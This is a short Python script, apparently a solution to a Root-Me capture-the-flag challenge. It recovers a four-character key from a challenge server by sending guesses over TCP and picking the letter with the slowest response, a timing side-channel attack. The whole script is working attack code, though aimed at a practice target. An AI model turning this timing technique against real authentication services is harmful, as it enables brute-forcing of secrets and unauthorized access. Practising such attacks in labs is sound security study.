import socket
import time

def getFlag():
    TCP_IP = '192.168.0.5'  # ip of challenge01.root-me.org
    TCP_PORT = 3333
    BUFFER_SIZE = 1024

    print("[+]- Connecting To %s:%d\n" % (TCP_IP, TCP_PORT))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((TCP_IP, TCP_PORT))
    data = s.recv(BUFFER_SIZE)

    print(data)

    chars = "abcdefghijklmnopqrstuvwxyz"
    time_char = 0
    char_found = ''
    key = ''

    for i in range(4):
        time_char = 0  # 시간을 0으로 초기화해야 가장 오래 걸리는 문자를 찾을 수 있음
        for c in chars:
            s.send((key + c).encode())  # 문자열을 바이트로 변환하여 전송
            debut = time.time()
            data = s.recv(BUFFER_SIZE)
            fin = time.time()
            diff = fin - debut
            print(c, "time =", diff)
            print("time_char",time_char)
            if diff > time_char:
                time_char = diff
                char_found = c
        print()
        key += char_found
    s.close()
    return key

def main():
    flag = getFlag()
    print("[+] - Flag is :", flag)

if __name__ == '__main__':
    main()

